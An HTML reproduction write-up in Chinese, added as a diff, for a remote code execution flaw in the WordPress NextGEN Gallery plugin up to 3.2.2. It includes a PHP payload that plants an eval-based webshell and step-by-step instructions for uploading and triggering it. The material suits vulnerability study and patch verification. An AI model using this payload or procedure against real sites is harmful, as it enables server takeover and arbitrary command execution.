@@ -1,0 +1,38 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
+			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="X65b67873a99eba2cca6b6cf8ed59a6f4ae1334f"><span class="csDE05BCC">WordPress Plugin - NextGEN Gallery &lt;= 3.2.2 RCE</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">WordPress</span><span class="cs9C1B1871">插件</span><span class="cs8926E06">NextGEN Gallery &lt;= 3.2.2</span><span class="cs9C1B1871">版本将上传的</span><span class="cs8926E06">zip</span><span class="cs9C1B1871">压缩包解压到</span><span class="cs8926E06">/wp-content/uploads</span><span class="cs9C1B1871">目录下的临时目录，该临时目录具有显著特点：以</span><span class="cs8926E06">unpacked</span><span class="cs9C1B1871">开头。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当</span><span class="cs8926E06">zip</span><span class="cs9C1B1871">压缩文件包含大量图片时将导致处理进程崩溃，而临时目录没有删除。如果在</span><span class="cs8926E06">zip</span><span class="cs9C1B1871">压缩包中放置一个</span><span class="cs8926E06">php</span><span class="cs9C1B1871">文件，那么该</span><span class="cs8926E06">php</span><span class="cs9C1B1871">文件会被解压到临时目录造成</span><span class="cs8926E06">RCE</span><span class="cs9C1B1871">漏洞。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">官方在</span><span class="cs8926E06">2019</span><span class="cs9C1B1871">年</span><span class="cs8926E06">6</span><span class="cs9C1B1871">月</span><span class="cs8926E06">4</span><span class="cs9C1B1871">日发布了</span><span class="cs8926E06">3.2.4</span><span class="cs9C1B1871">版本修复了漏洞。</span></p><h2 class="cs868C439D">
+			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<h3 class="cs868C439D">
+			<a name="第1步：制作zip压缩包"><span class="csD6CA00D2">第</span><span class="csD1E291E2">1</span><span class="csD6CA00D2">步：制作</span><span class="csD1E291E2">Zip</span><span class="csD6CA00D2">压缩包</span></a></h3>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">我制作了一个包含</span><span class="cs8926E06">800</span><span class="cs9C1B1871">张图片和</span><span class="cs8926E06">1</span><span class="cs9C1B1871">个恶意</span><span class="cs8926E06">php</span><span class="cs9C1B1871">文件（</span><span class="cs8926E06">abc233.php</span><span class="cs9C1B1871">）的</span><span class="cs8926E06">zip</span><span class="cs9C1B1871">压缩包，图片都是几</span><span class="cs8926E06">KB</span><span class="cs9C1B1871">的小图片，恶意</span><span class="cs8926E06">php</span><span class="cs9C1B1871">文件的功能是往上级目录写入</span><span class="cs8926E06">webshell</span><span class="cs9C1B1871">，</span><span class="cs8926E06">abc233.php</span><span class="cs9C1B1871">文件内容如下：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;file_put_contents(&#39;../webshell666.php&#39;, &#39;&lt;?php @eval($_REQUEST[&quot;cmdx&quot;]);?&gt;&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">?&gt;</span></p><h3 class="cs868C439D">
+			<a name="第2步：上传zip压缩包"><span class="csD6CA00D2">第</span><span class="csD1E291E2">2</span><span class="csD6CA00D2">步：上传</span><span class="csD1E291E2">zip</span><span class="csD6CA00D2">压缩包</span></a></h3>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">点击</span><span class="cs8926E06">&ldquo;Add Gallery / Images&rdquo;</span><span class="cs9C1B1871">然后上传</span><span class="cs8926E06">zip</span><span class="cs9C1B1871">压缩包。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Wordpress/Wordpress_插件漏洞/WordPress%20Plugin%20-%20NextGEN%20Gallery%20_=%203.2.2%20RCE%20_files/image0.png" width="560" height="101" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
+			<a name="第3步：查看临时目录"><span class="csD6CA00D2">第</span><span class="csD1E291E2">3</span><span class="csD6CA00D2">步：查看临时目录</span></a></h3>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">点击</span><span class="cs8926E06">&ldquo;import folder&rdquo;</span><span class="cs9C1B1871">，再点击</span><span class="cs8926E06">&ldquo;uploads&rdquo;</span><span class="cs9C1B1871">即可看到解压的临时目录。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Wordpress/Wordpress_插件漏洞/WordPress%20Plugin%20-%20NextGEN%20Gallery%20_=%203.2.2%20RCE%20_files/image1.png" width="560" height="305" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
+			<a name="第4步：生成webshell"><span class="csD6CA00D2">第</span><span class="csD1E291E2">4</span><span class="csD6CA00D2">步：生成</span><span class="csD1E291E2">webshell</span></a></h3>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">访问临时目录下的</span><span class="cs8926E06">abc233.php</span><span class="cs9C1B1871">文件即可在</span><span class="cs8926E06">/wp-content/uploads</span><span class="cs9C1B1871">目录下生成</span><span class="cs8926E06">webshell</span><span class="cs9C1B1871">。</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://0-sec.org/wp-content/uploads/unpacked-phpA0CB.tmp/abc233.php</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Wordpress/Wordpress_插件漏洞/WordPress%20Plugin%20-%20NextGEN%20Gallery%20_=%203.2.2%20RCE%20_files/image2.png" width="560" height="150" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p></body>
+</html>
